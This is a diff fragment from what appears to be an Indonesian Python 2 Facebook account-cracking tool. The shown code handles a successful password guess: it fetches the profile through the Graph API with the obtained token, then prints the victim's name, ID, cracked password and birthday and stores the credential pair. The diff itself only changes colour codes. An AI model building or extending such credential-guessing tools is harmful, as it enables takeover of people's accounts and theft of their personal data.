@@ -465,10 +465,10 @@ def pilih_indo():
 										x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
 										z = json.loads(x.text)
 										print '\x1c\033[1;97m[\033[1;91m✔\033[1;97m] \x1c\033[1;33mBerhasil'
-										print '\x1c\033[1;97m[\033[1;91m✴\033[1;97m] \x1c\033[1;93mName \x1c\033[1;91m    : \x1c\033[1;33m' + c['name']
-										print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\033[1;93mID \x1c\033[1;91m      : \x1c\033[1;33m' + user
-										print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\033[1;93mPassword \x1c\033[1;91m: \x1c\033[1;33m' + pass4 + '\n'
-										print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\033[1;93mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;33m' + c['birthday']
+										print '\x1c\033[1;97m[\033[1;91m✴\033[1;97m] \x1c\033[1;33mName \x1c\033[1;91m    : \x1c\033[1;33m' + c['name']
+										print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\033[1;33mID \x1c\033[1;91m      : \x1c\033[1;33m' + user
+										print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\033[1;33mPassword \x1c\033[1;91m: \x1c\033[1;33m' + pass4 + '\n'
+										print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\033[1;33mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;33m' + c['birthday']
 										oks.append(user+pass4)
 									else:
 										if 'www.facebook.com' in w['error_msg']:
